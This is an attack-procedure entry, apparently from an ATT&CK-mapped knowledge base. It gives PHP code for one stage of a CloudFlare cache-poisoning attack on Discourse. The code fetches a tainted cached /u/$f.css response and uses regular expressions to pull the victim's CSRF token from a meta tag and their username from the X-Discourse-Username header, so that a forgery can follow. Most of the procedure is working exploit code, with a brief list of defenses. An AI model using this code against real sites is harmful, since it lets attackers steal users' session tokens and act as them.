---
tags:
  - extraction
  - php
  - token-leak
type: procedure
tools:
  - '[[tools/PHP-for-Server-Side-Extraction]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/php-file-get-contents-u-f-css]]'
  - '[[commands/php-preg-match-csrf-token]]'
  - '[[commands/php-preg-match-username-header]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:33:24.440Z'
sub_techniques: []
id: fa216be8-8977-450b-962f-a8c824dbe8c0
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Extract Leaked CSRF Token and Username from Cache

## Summary

This procedure uses server-side PHP to fetch the tainted CloudFlare cache and parse the response for the victim's CSRF token and username, requiring execution from the same region.

## Description

After taint, the attacker's PHP script requests the cached /u/$f.css URL, ignoring errors, and uses regex to extract the token from HTML meta and username from headers. This bypasses direct access by leveraging the shared cache.

## Requirements

1. PHP server in same CloudFlare region
2. Known $f from taint step
3. Target Discourse URL

## Defense

Defensive measures and detection strategies:

- Purge caches periodically for user content
- Restrict header exposure like X-Discourse-Username
- WAF rules to block repeated .css fetches from single IP

## Objectives

1. Retrieve cached victim data
2. Parse token and username
3. Enable forgery in next step

## Instructions

### Step 1: Fetch Cached Content

**Context**: Use file_get_contents to get tainted response.

**Command** ([[commands/php-file-get-contents-u-f-css]]):
```php
$ctx = stream_context_create(['http' => ['ignore_errors' => true]]);
$data = file_get_contents($discourse . '/u/' . $f . '.css', false, $ctx);
```

> $data contains HTML; $http_response_header has headers.

### Step 2: Extract CSRF Token

**Context**: Regex parse meta tag.

**Command** ([[commands/php-preg-match-csrf-token]]):
```php
preg_match('/name="csrf-token" content="([a-zA-Z0-9\/=+\/]+)"/', $data, $matches);
```

> $matches[1] holds token.

### Step 3: Extract Username

**Context**: Parse response headers.

**Command** ([[commands/php-preg-match-username-header]]):
```php
preg_match('/X-Discourse-Username: (.*)/', implode("\n", $http_response_header), $name_matches);
```

> $name_matches[1] holds username.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Local System]]

### Sub-Techniques


## Commands Used

- [[commands/php-file-get-contents-u-f-css]]
- [[commands/php-preg-match-csrf-token]]
- [[commands/php-preg-match-username-header]]

## Tools Used

- [[tools/PHP-for-Server-Side-Extraction]]

## Tags

- [[extraction]]
- [[php]]
- [[token-leak]]
